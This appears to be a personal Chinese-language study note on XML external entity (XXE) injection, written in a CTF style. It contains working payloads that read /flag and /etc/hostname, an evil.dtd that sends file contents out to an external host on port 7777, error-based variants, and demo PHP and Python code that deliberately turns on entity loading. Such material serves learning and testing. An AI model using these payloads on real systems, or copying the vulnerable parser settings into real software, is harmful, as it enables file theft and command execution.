---
title: "XXE"
modDatetime: 2025-01-20T21:06:41.000+08:00
description: "XML 外部实体注入原理、利用方式与防护记录"
tags: ["XXE"]
---

[参考文章](https://xz.aliyun.com/news/2994#toc-10)
[xml、xpath注入](https://xz.aliyun.com/t/6887)

## xml注入

参考xss注入

## xpath注入

参考sql注入

## xxe (xml外部实体引用)

### 有回显情况

```php
$xmlfile=file_get_contents('php://input')
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);

$username = $creds->username;
$password = $creds->password;

if($username == $USERNAME && $password == $PASSWORD){
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
}else{
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
}
```

payload =

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE hack [
<!ENTITY file SYSTEM  "php://filter/read=convert.base64-encode/resource=/flag">
]>
<user>
    <username>
        &file;
    </username>
    <password>
        whatever
    </password>
</user>
```

其中`&file;`用于引用访问结果
如果环境中装有expect扩展，把`php://filter/read=convert.base64-encode/resource=/flag`换成
`expect://ls`可以实现任意命令执行.

### 无回显

#### 出网

vps上部署evil.dtd

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hostname">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://mekrina.tech:7777/?p=%file;'>">

%int;
%send;
```

这部分必须在vps上是因为 只有在 DTD 文件中，参数实体的声明才能引用其他实体
send前面的%必须要编码%#x25，可能如果不编码会被识别为参数，但找不到%send

上传的xml，`<?xml ... ?>`标签可有可无

```dtd
<?xml version="1.0"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://ip:7777/evil.dtd">
%remote;
]>
<user>
    <username>www</username>
    <password></password>
</user>
```

实际数据视情况而定

```xml
<user>
    <username>www</username>
    <password></password>
</user>
```

**疑问：**

1. 为什么vps的dtd文件中不能直接定义
   `<!ENTITY % send SYSTEM 'http://ip:7777?p=%file;' >`
   然后执行 `%send;` ?

-> 因为实体里面不能嵌套，所以必须要用动态实体

2. 为什么非得用远程dtd

-> 远程dtd是外部实体，要求宽松，允许实体嵌套，而内部实体不允许

#### 不出网

报错？

php中不需要覆盖, 直接用如下payload

```xml
<!DOCTYPE foo [
<!ENTITY % xxx '
<!ENTITY &#x25; file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%xxx;
]>
```

在其他解析器中可能报错`The parameter entity reference "%file;" cannot occur within markup in the internal subset of the DTD.`
就是说内部实体不能嵌套，此时可以采用如下方法，**_没复现成功_**

存在`home/mekrina/tmp/sgyj/data.dtd`, 其中包括一个dtd

```xml
<!ENTITY % constant 'int'>
```

这是可覆盖这个外部实体，即可使用嵌套实体，报错带出数据

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///home/mekrina/tmp/sgyj/data.dtd">
<!ENTITY % constant '
<!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
%constant;
]>
```

## 实验demo

### python

```python
from lxml import etree

xml_data = b"""<?xml version="1.0"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://ip:7777/evil.dtd">
%remote;
]>
<user>
    <username>www</username>
    <password></password>
</user>
"""

parser = etree.XMLParser(
    resolve_entities=True,
    no_network=False,
)

try:
    tree = etree.fromstring(xml_data, parser)
    print(etree.tostring(tree).decode())
except Exception as e:
    print(f"解析出错: {e}")
```

### php

```php
<?php
// 允许加载外部实体（这是 XXE 存在的关键）
libxml_disable_entity_loader(false);

$xml_data = file_get_contents("data.xml");

    // 解析 XML。设置 LIBXML_NOENT 以替换实体，LIBXML_DTDLOAD 以加载 DTD
$dom = simplexml_load_string($xml_data, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDVALID); # LIBXML_NOENT 和 LIBXML_DTDVALID必须有一个
```
